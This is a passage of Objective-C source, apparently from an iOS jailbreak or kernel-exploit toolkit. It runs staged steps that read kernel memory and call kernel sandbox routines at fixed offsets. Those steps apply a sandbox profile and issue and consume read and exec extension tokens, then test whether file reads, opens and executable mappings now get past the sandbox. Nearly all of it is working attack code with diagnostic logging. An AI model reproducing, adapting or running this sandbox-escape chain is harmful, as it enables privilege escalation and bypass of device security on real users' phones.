    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.07 KCALL607_CONSUME_RESULT kern_ret=%d handle_out=%lld configured_slot=%u profile=0x%llx token_len=%zu",
        consume_kern_ret, (long long)handle_out, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw, token_len);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL607_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.07 KCALL607_CONSUME_DISPATCH_FAIL");
        return -22;
    }

    if (consume_kern_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL607_CONSUME_KERN_FAIL");
        dt1025_stage(@"build102.6.07 KCALL607_CONSUME_KERN_FAIL");
    } else if (handle_out > 0) {
        dt1025_set_verdict(verdictOut, @"KCALL607_CONSUME_HANDLE_NONZERO");
        dt1025_stage(@"build102.6.07 KCALL607_CONSUME_HANDLE_NONZERO");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL607_CONSUME_HANDLE_ZERO");
        dt1025_stage(@"build102.6.07 KCALL607_CONSUME_HANDLE_ZERO");
    }

    dt1025_log(log, @"[*] build102.6.07 KCALL607_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.07 KCALL607_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.07 KCALL607_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[*] build102.6.07 verdict=%@ order=issue_apply_consume dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_run_608_handle_effect_file_read(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.08 KCALL608_HANDLE_EFFECT_FILE_READ begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.08 KCALL608_HANDLE_EFFECT_FILE_READ");
    dt1025_stage(@"build102.6.08 KCALL608_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_log(log, @"[!] build102.6.08 self-target fail self_pid=%d getpid=%d proc=0x%llx",
            (int)self_pid, upid, (unsigned long long)proc_kptr);
        dt1025_set_verdict(verdictOut, @"KCALL608_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL608_SELF_TARGET_FAIL");
        return -11;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.08 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL608_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_log(log, @"[!] build102.6.08 pre-issue configured slot%u raw=0x%llx (expected -1)",
            (unsigned)configured_slot, (unsigned long long)self_pre.configured_raw);
        dt1025_set_verdict(verdictOut, @"KCALL608_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.08 KCALL608_PRE_ISSUE_SLOT1_NOT_NULL");
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.08 pre-issue NULL-profile confirmed configured_slot=%u raw=-1",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassRead, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL608_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.08 KCALL608_ISSUE_FAIL_NULL_PROFILE");
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.08 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassRead, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.08 KCALL608_ISSUE_TOKEN_WHILE_NULL_PROFILE_OK");

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    dt1025_log(log, @"[*] build102.6.08 53D540 bundle profile=%s ext_ptr=0 ext_len=0",
        kDT604BuiltinProfileName);

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_53D540_DISPATCH_FAIL");
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL608_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.08 %@", fail]);
        return -13;
    }

    dt1025_stage(@"build102.6.08 KCALL608_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_MIRROR_CHAIN_FAIL");
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.08 KCALL608_SLOT1_STILL_NULL");
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class == 1) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.08 KCALL608_SLOT1_INVALID_SHAPE");
        return -18;
    }
    if (shape_class == 3) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.08 KCALL608_SLOT1_AMBIGUOUS_SHAPE");
        return -19;
    }
    if (shape_class != 2) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL608_SLOT1_SHAPE_UNKNOWN");
        return -21;
    }

    dt1025_stage(@"build102.6.08 KCALL608_APPLY_MIRROR_OK");
    dt1025_log(log, @"[*] build102.6.08 mirror OK configured_slot=%u cfg_raw=0x%llx",
        (unsigned)configured_slot, (unsigned long long)self_post.configured_raw);

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.08 KCALL608_CONSUME_RESULT kern_ret=%d handle_out=%lld configured_slot=%u profile=0x%llx token_len=%zu",
        consume_kern_ret, (long long)handle_out, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw, token_len);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL608_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.08 KCALL608_DEVICE_RUN_COMPLETE");
        return -22;
    }

    if (consume_kern_ret != 0 || handle_out <= 0) {
        if (consume_kern_ret != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL608_CONSUME_KERN_FAIL");
            dt1025_stage(@"build102.6.08 KCALL608_CONSUME_KERN_FAIL");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL608_CONSUME_HANDLE_ZERO");
            dt1025_stage(@"build102.6.08 KCALL608_CONSUME_HANDLE_ZERO");
        }
        dt1025_stage(@"build102.6.08 KCALL608_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.08 KCALL608_DEVICE_RUN_COMPLETE");
        return -23;
    }

    dt1025_stage(@"build102.6.08 KCALL608_CONSUME_HANDLE_NONZERO");
    dt1025_stage(@"build102.6.08 KCALL608_READ_EFFECT_BEGIN");

    const char *read_path = kDTJbPath;
    struct stat st;
    memset(&st, 0, sizeof(st));
    errno = 0;
    int stat_ret = stat(read_path, &st);
    int stat_errno = errno;

    dt1025_log(log, @"[*] build102.6.08 KCALL608_READ_RESULT op=stat path=%s ret=%d errno=%d handle=%lld profile=0x%llx",
        read_path, stat_ret, stat_errno, (long long)handle_out,
        (unsigned long long)self_post.configured_raw);

    if (stat_ret == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL608_READ_EFFECT_OK");
        dt1025_stage(@"build102.6.08 KCALL608_READ_EFFECT_OK");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL608_READ_EFFECT_FAIL");
        dt1025_stage(@"build102.6.08 KCALL608_READ_EFFECT_FAIL");
    }

    dt1025_stage(@"build102.6.08 KCALL608_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.08 KCALL608_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[*] build102.6.08 verdict=%@ order=issue_apply_consume_read dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_run_609_handle_effect_file_read_data(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.09 KCALL609_HANDLE_EFFECT_FILE_READ_DATA begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.09 KCALL609_HANDLE_EFFECT_FILE_READ_DATA");
    dt1025_stage(@"build102.6.09 KCALL609_KCALL_SAFE_PROBE_OK_CONFIRMED");

    struct stat g2_bash_st;
    int g2_bash_stat = stat(kDT609ReadDataPath, &g2_bash_st);
    dt1025_log(log, @"[*] build102.6.09 KCALL609_G2_PREFLIGHT path=%s exists=%d size=%lld errno=%d (run G2 extract before G5)",
        kDT609ReadDataPath, g2_bash_stat == 0 ? 1 : 0,
        g2_bash_stat == 0 ? (long long)g2_bash_st.st_size : -1LL, g2_bash_stat == 0 ? 0 : errno);

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL609_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL609_SELF_TARGET_FAIL");
        return -11;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL609_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.09 KCALL609_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_set_verdict(verdictOut, @"KCALL609_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.09 KCALL609_PRE_ISSUE_SLOT1_NOT_NULL");
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.09 pre-issue NULL-profile confirmed configured_slot=%u raw=-1",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassRead, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL609_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.09 KCALL609_ISSUE_FAIL_NULL_PROFILE");
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.09 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassRead, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.09 KCALL609_ISSUE_TOKEN_WHILE_NULL_PROFILE_OK");

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.09 KCALL609_53D540_DISPATCH_FAIL");
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL609_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.09 %@", fail]);
        return -13;
    }

    dt1025_stage(@"build102.6.09 KCALL609_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.09 KCALL609_MIRROR_CHAIN_FAIL");
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.09 KCALL609_SLOT1_STILL_NULL");
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class == 1) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.09 KCALL609_SLOT1_INVALID_SHAPE");
        return -18;
    }
    if (shape_class == 3) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.09 KCALL609_SLOT1_AMBIGUOUS_SHAPE");
        return -19;
    }
    if (shape_class != 2) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL609_SLOT1_SHAPE_UNKNOWN");
        return -21;
    }

    dt1025_stage(@"build102.6.09 KCALL609_APPLY_MIRROR_OK");

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.09 KCALL609_CONSUME_RESULT kern_ret=%d handle_out=%lld configured_slot=%u profile=0x%llx token_len=%zu",
        consume_kern_ret, (long long)handle_out, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw, token_len);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL609_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.09 KCALL609_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.09 KCALL609_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.09 KCALL609_DEVICE_RUN_COMPLETE");
        return -22;
    }

    if (consume_kern_ret != 0 || handle_out <= 0) {
        if (consume_kern_ret != 0) {
            dt1025_set_verdict(verdictOut, @"KCALL609_CONSUME_KERN_FAIL");
            dt1025_stage(@"build102.6.09 KCALL609_CONSUME_KERN_FAIL");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL609_CONSUME_HANDLE_ZERO");
            dt1025_stage(@"build102.6.09 KCALL609_CONSUME_HANDLE_ZERO");
        }
        dt1025_stage(@"build102.6.09 KCALL609_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.09 KCALL609_DEVICE_RUN_COMPLETE");
        return -23;
    }

    dt1025_stage(@"build102.6.09 KCALL609_CONSUME_HANDLE_NONZERO");
    dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_BEGIN");

    const char *data_path = kDT609ReadDataPath;
    errno = 0;
    int fd = open(data_path, O_RDONLY);
    int open_errno = errno;

    if (fd < 0) {
        dt1025_log(log, @"[*] build102.6.09 KCALL609_READ_DATA_RESULT op=open path=%s fd=%d errno=%d handle=%lld profile=0x%llx",
            data_path, fd, open_errno, (long long)handle_out,
            (unsigned long long)self_post.configured_raw);
        if (open_errno == ENOENT) {
            dt1025_set_verdict(verdictOut, @"KCALL609_READ_DATA_PATH_MISSING");
            dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_PATH_MISSING");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL609_READ_DATA_EFFECT_DENY");
            dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_EFFECT_DENY");
        }
    } else {
        char read_buf[kDT609ReadDataBytes];
        memset(read_buf, 0, sizeof(read_buf));
        errno = 0;
        ssize_t read_ret = read(fd, read_buf, kDT609ReadDataBytes);
        int read_errno = errno;
        errno = 0;
        int close_ret = close(fd);
        int close_errno = errno;

        dt1025_log(log, @"[*] build102.6.09 KCALL609_READ_DATA_RESULT op=open_read path=%s open_fd=%d read_ret=%zd read_errno=%d close_ret=%d close_errno=%d handle=%lld profile=0x%llx",
            data_path, fd, read_ret, read_errno, close_ret, close_errno,
            (long long)handle_out, (unsigned long long)self_post.configured_raw);

        if (read_ret >= 0) {
            dt1025_set_verdict(verdictOut, @"KCALL609_READ_DATA_EFFECT_OK");
            dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_EFFECT_OK");
        } else if (read_errno == ENOENT) {
            dt1025_set_verdict(verdictOut, @"KCALL609_READ_DATA_PATH_MISSING");
            dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_PATH_MISSING");
        } else {
            dt1025_set_verdict(verdictOut, @"KCALL609_READ_DATA_EFFECT_DENY");
            dt1025_stage(@"build102.6.09 KCALL609_READ_DATA_EFFECT_DENY");
        }
    }

    dt1025_stage(@"build102.6.09 KCALL609_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.09 KCALL609_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[*] build102.6.09 verdict=%@ order=issue_apply_consume_read_data dash=NO helper=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_run_610_executable_extension_consume(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.10 KCALL610_EXECUTABLE_EXTENSION_CONSUME begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.10 KCALL610_EXECUTABLE_EXTENSION_CONSUME");
    dt1025_stage(@"build102.6.10 KCALL610_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL610_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL610_SELF_TARGET_FAIL");
        return -11;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL610_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_set_verdict(verdictOut, @"KCALL610_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.10 KCALL610_PRE_ISSUE_SLOT1_NOT_NULL");
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.10 pre-issue NULL-profile confirmed configured_slot=%u slot1_raw=0xffffffffffffffff",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassExec, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL610_EXECUTABLE_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.10 KCALL610_EXECUTABLE_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.10 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassExec, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.10 KCALL610_EXECUTABLE_ISSUE_WHILE_NULL_OK");

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL610_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.10 %@", fail]);
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -13;
    }

    dt1025_stage(@"build102.6.10 KCALL610_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.10 KCALL610_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class == 1) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.10 KCALL610_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -18;
    }
    if (shape_class == 3) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.10 KCALL610_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -19;
    }
    if (shape_class != 2) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL610_SLOT1_SHAPE_UNKNOWN");
        dt1025_stage(@"build102.6.10 KCALL610_SLOT1_SHAPE_UNKNOWN");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -21;
    }

    dt1025_stage(@"build102.6.10 KCALL610_APPLY_MIRROR_OK");
    dt1025_stage(@"build102.6.10 KCALL610_SINGLE_EXEC_CONSUME_BEGIN");

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.10 KCALL610_CONSUME_RESULT kern_ret=%d handle_out=%lld token_len=%zu configured_slot=%u profile=0x%llx",
        consume_kern_ret, (long long)handle_out, token_len, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw);

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL610_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
        dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
        return -22;
    }

    if (consume_kern_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL610_CONSUME_KERN_FAIL");
        dt1025_stage(@"build102.6.10 KCALL610_CONSUME_KERN_FAIL");
    } else if (handle_out <= 0) {
        dt1025_set_verdict(verdictOut, @"KCALL610_CONSUME_HANDLE_ZERO");
        dt1025_stage(@"build102.6.10 KCALL610_CONSUME_HANDLE_ZERO");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL610_CONSUME_HANDLE_NONZERO");
        dt1025_stage(@"build102.6.10 KCALL610_CONSUME_HANDLE_NONZERO");
    }

    dt1025_stage(@"build102.6.10 KCALL610_NO_MMAP_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.10 KCALL610_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[*] build102.6.10 verdict=%@ order=issue_exec_apply_mirror_consume dash=NO helper=NO mmap=NO loader_lanes=NO",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static void dt1025_run_611_finish(void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    (void)log;
    dt1025_stage(@"build102.6.11 KCALL611_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.11 KCALL611_DEVICE_RUN_COMPLETE");
}

static int dt1025_run_611_mmap_op16_effect(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.11 KCALL611_MMAP_OP16_EFFECT begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.11 KCALL611_MMAP_OP16_EFFECT");
    dt1025_stage(@"build102.6.11 KCALL611_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_set_verdict(verdictOut, @"KCALL611_SELF_TARGET_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL611_SELF_TARGET_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -11;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL611_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.11 KCALL611_MIRROR_CHAIN_FAIL");
        dt1025_run_611_finish(log, verdictOut);
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_set_verdict(verdictOut, @"KCALL611_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.11 KCALL611_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_run_611_finish(log, verdictOut);
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.11 pre-issue NULL-profile confirmed configured_slot=%u slot1_raw=0xffffffffffffffff",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassExec, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL611_EXECUTABLE_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.11 KCALL611_EXECUTABLE_ISSUE_FAIL_NULL_PROFILE");
        dt1025_run_611_finish(log, verdictOut);
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.11 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassExec, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.11 KCALL611_EXECUTABLE_ISSUE_WHILE_NULL_OK");

    dt_sandbox_apply_bundle_t bundle = {
